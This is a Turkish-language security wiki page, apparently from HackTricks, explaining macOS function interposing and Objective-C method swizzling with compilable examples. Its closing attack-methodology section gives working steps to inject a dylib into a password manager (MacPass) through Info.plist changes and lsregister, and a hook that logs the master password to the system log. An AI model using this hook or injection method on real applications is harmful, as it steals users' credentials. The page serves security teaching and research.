# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Bir **dylib** oluşturun ve içinde **`__interpose`** bölümü (veya **`S_INTERPOSING`** ile işaretlenmiş bir bölüm) bulunan, **orijinal** ve **değiştirme** fonksiyonlarına atıfta bulunan **fonksiyon işaretçileri** çiftleri içersin.

Sonra, **`DYLD_INSERT_LIBRARIES`** ile dylib'i **enjekte** edin (interposing, ana uygulama yüklenmeden önce gerçekleşmelidir). Açıkça, [**`DYLD_INSERT_LIBRARIES`** kullanımına uygulanan **kısıtlamalar** burada da geçerlidir](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Method Swizzling

ObjectiveC'de bir metod şu şekilde çağrılır: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**nesne**, **metod** ve **parametreler** gereklidir. Ve bir metod çağrıldığında bir **msg gönderilir** `objc_msgSend` fonksiyonu kullanılarak: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Nesne **`someObject`**, metod **`@selector(method1p1:p2:)`** ve argümanlar **value1**, **value2**'dir.

Nesne yapıları takip edilerek, **metodların** **isimlerinin** ve metod koduna ait **işaretçilerin** **bulunduğu** bir **metodlar dizisine** ulaşmak mümkündür.

> [!CAUTION]
> Metodlar ve sınıflar isimlerine göre erişildiğinden, bu bilginin ikili dosyada saklandığını unutmayın, bu nedenle `otool -ov </path/bin>` veya [`class-dump </path/bin>`](https://github.com/nygard/class-dump) ile geri almak mümkündür.

### Ham metodlara erişim

Metodların ismi, parametre sayısı veya adresi gibi bilgilerine aşağıdaki örnekte olduğu gibi erişmek mümkündür:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Fonksiyon **`method_exchangeImplementations`**, **bir fonksiyonun** **uygulamasının adresini** **diğerine değiştirmeye** olanak tanır.

> [!CAUTION]
> Bu nedenle bir fonksiyon çağrıldığında **çalıştırılan diğeri**dir.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Bu durumda, eğer **meşru** metodun **uygulama kodu** **metod** **adını** **doğruluyorsa**, bu swizzling'i **tespit** edebilir ve çalışmasını engelleyebilir.
>
> Aşağıdaki teknik bu kısıtlamaya sahip değildir.

### method_setImplementation ile Metod Swizzling

Önceki format garip çünkü bir metodun uygulamasını diğerinin üzerine değiştiriyorsunuz. **`method_setImplementation`** fonksiyonunu kullanarak bir **metodun uygulamasını diğerinin** üzerine **değiştirebilirsiniz**.

Sadece, **orijinal olanın uygulama adresini saklamayı** unutmayın, eğer onu yeni uygulamadan çağıracaksanız, çünkü daha sonra o adresi bulmak çok daha karmaşık olacaktır.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Bu sayfada fonksiyonları hooklamak için farklı yollar tartışıldı. Ancak, bunlar **saldırı için süreç içinde kod çalıştırmayı** içeriyordu.

Bunu yapmak için en kolay teknik, bir [Dyld'yi ortam değişkenleri aracılığıyla veya ele geçirerek](../macos-dyld-hijacking-and-dyld_insert_libraries.md) enjekte etmektir. Ancak, bunun [Dylib süreç enjeksiyonu](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) aracılığıyla da yapılabileceğini düşünüyorum.

Ancak, her iki seçenek de **korumasız** ikili/süreçlerle **sınırlıdır**. Sınırlamalar hakkında daha fazla bilgi edinmek için her tekniği kontrol edin.

Ancak, bir fonksiyon hooklama saldırısı çok spesifiktir, bir saldırgan bunu **bir süreçten hassas bilgileri çalmak için** yapar (aksi takdirde sadece bir süreç enjeksiyonu saldırısı yapardınız). Ve bu hassas bilgiler, MacPass gibi kullanıcı tarafından indirilen uygulamalarda bulunabilir.

Bu nedenle, saldırgan vektörü ya bir zafiyet bulmak ya da uygulamanın imzasını kaldırmak, uygulamanın Info.plist dosyasına **`DYLD_INSERT_LIBRARIES`** env değişkenini eklemek gibi bir şey eklemektir:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
ve ardından **uygulamayı yeniden kaydet**:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Kütüphaneye bilgileri dışa aktarmak için hooking kodunu ekleyin: Parolalar, mesajlar...

> [!CAUTION]
> Daha yeni macOS sürümlerinde, eğer uygulama ikili dosyasının **imzasını kaldırırsanız** ve daha önce çalıştırılmışsa, macOS **uygulamayı bir daha çalıştırmayacaktır**.

#### Kütüphane örneği
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referanslar

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
